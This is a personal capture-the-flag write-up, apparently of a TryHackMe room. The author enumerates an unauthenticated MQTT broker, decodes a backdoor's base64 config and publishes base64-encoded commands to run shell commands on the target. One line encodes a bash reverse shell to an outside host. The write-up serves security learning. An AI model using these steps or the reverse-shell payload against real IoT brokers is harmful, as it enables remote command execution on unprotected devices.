# Bugged Writeup

Name: Bugged
Date:  4/7/2023
Difficulty:  Easy
Goals:  
- IoT 
- Improve my notes on IoT
Learnt:
- No authentication

There will be nothing in:
- [[Bugged-Notes.md]]
- [[Bugged-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS - Windows on IoT does exist, but this Linux of some sort.
![ping](TryHackMe/Markdown/Bugged/Screenshots/ping.png)

Nmap did a lot of work with mosquitto subscribe module.
```lua
PORT     STATE SERVICE
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/bytes/received: 81580
|     yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
|     $SYS/broker/load/messages/received/15min: 64.97
|     $SYS/broker/load/connections/5min: 0.37
|     $SYS/broker/clients/total: 2
|     $SYS/broker/clients/active: 1
|     $SYS/broker/load/bytes/received/15min: 3079.94
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/load/publish/sent/5min: 6.81
|     storage/thermostat: {"id":18217655018874804083,"temperature":23.400383}
|     $SYS/broker/load/publish/sent/1min: 24.45
|     $SYS/broker/messages/sent: 1778
|     $SYS/broker/messages/received: 1714
|     $SYS/broker/messages/stored: 42
|     $SYS/broker/retained messages/count: 41
|     $SYS/broker/load/messages/sent/5min: 95.76
|     livingroom/speaker: {"id":3680305474968110098,"gain":56}
|     $SYS/broker/clients/disconnected: 1
|     $SYS/broker/load/connections/1min: 1.27
|     $SYS/broker/uptime: 1144 seconds
|     $SYS/broker/version: mosquitto version 2.0.14
|     frontdeck/camera: {"id":15592661674503362626,"yaxis":-67.172966,"xaxis":-9.135452,"zoom":1.858287,"movement":true}
|     $SYS/broker/load/messages/received/1min: 93.80
|     $SYS/broker/store/messages/count: 42
|     $SYS/broker/load/messages/sent/1min: 118.25
|     $SYS/broker/store/messages/bytes: 284
|     $SYS/broker/load/sockets/5min: 0.37
|     $SYS/broker/publish/bytes/received: 58270
|     $SYS/broker/load/sockets/1min: 1.27
|     $SYS/broker/load/bytes/sent/15min: 375.97
|     patio/lights: {"id":14863873651254817145,"color":"RED","status":"ON"}
|     $SYS/broker/load/connections/15min: 0.15
|     $SYS/broker/publish/messages/sent: 65
|     $SYS/broker/publish/bytes/sent: 778
|     $SYS/broker/load/bytes/received/1min: 4275.24
|     $SYS/broker/load/messages/sent/15min: 67.37
|     $SYS/broker/load/publish/sent/15min: 2.40
|     $SYS/broker/load/bytes/sent/1min: 1552.37
|     $SYS/broker/load/sockets/15min: 0.15
|     $SYS/broker/load/messages/received/5min: 88.96
|     $SYS/broker/clients/inactive: 1
|     $SYS/broker/clients/connected: 1
|     $SYS/broker/load/bytes/sent/5min: 684.98
|     $SYS/broker/bytes/sent: 9892
|     $SYS/broker/load/bytes/received/5min: 4185.79
|_    $SYS/broker/subscriptions/count: 3
```

The base64 is...
```bash
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Broker:
```c
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config:
```

```json
{
"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
"registered_commands": ["HELP","CMD","SYS"],
"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
"sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

Read about no authentication from [Security Cafe](https://securitycafe.ro/2022/04/08/iot-pentesting-101-how-to-hack-mqtt-the-standard-for-iot-messaging/)
```bash
mosquitto_sub -h $ip -t '#' -v
```
And the output
![](noauthmos.png)

Managed to publish 
```bash
# "{\"CMD\":\"id\"}"
mosquitto_pub -h 10.10.224.23 -t yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config -m "eyJDTUQiOiJpZCJ9Cg=="
```
resulting in
![](publishing.png)

It is not decoding the message and executing on it.
![](helloterminal.png)

And then I tried 
![1080](bingo.png)



```bash
mosquitto_sub -h 10.10.224.23 -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -v
mosquitto_sub -h 10.10.224.23 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -v
mosquitto_pub -h 10.10.224.23 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'SYS'
# Returned 
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
# Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})

echo "{\"id\": \"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\", \"cmd\": \"id\", \"arg\": \"\"}" | base64 -w0

# HELP response
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ== | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
# for visbility:
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
"response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\n

Commands:\n    HELP: Display help message (takes no arg)\n    
CMD: Run a shell command\n    
SYS: Return system information (takes no arg)\n"
}

# No response 
echo "{\"id\": \"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\", \"cmd\": \"CMD\", \"arg\": \"bash -i >& /dev/tcp/10.10.10.10/0000 0>&1\"}" | base64 -w0

# Try ls
echo "{\"id\": \"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\", \"cmd\": \"CMD\", \"arg\": \"ls -la\"}" | base64 -w0

```

But Ls works and there is the flag.txt
![](lsls.png)